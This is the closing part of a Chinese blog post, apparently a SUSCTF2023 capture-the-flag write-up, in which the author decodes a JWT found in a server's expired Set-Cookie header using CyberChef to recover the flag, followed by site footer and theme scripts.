<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111817582.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111817582.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111817582.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111817582.png?size=large 2x" sizes="auto" data-title="image-20231016111817582" data-alt="image-20231016111817582" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现服务器的set-cookie，虽然已经过期了，但是应该有什么信息。这里应该是JWT格式，直接扔到cyberchef中解密即可。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016112004176.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016112004176.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016112004176.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016112004176.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016112004176.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016112004176.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>成功找到flag。</p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2023-10-16 12:00:00">更新于 2023-10-16&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"><span><a href="/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
      <div class="post-info-share">
        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/" data-title="SUSCTF2023-东南大学校赛WriteUp" data-via="a1extang" data-hashtags="CTF,SUSCTF,WriteUp"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/" data-title="SUSCTF2023-东南大学校赛WriteUp"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/susctf/' class="post-tag">SUSCTF</a><a href='/tags/writeup/' class="post-tag">WriteUp</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/articles/2023/10/newstarctf2023-week2-pwn/" class="post-nav-item" rel="prev" title="NewStarCTF2023-Week2-Pwn"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>NewStarCTF2023-Week2-Pwn</a>
      <a href="/articles/2023/10/%E6%A0%A1%E8%B5%9Bpwn%E5%A4%8D%E7%9B%98/" class="post-nav-item" rel="next" title="校赛Pwn复盘">校赛Pwn复盘<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
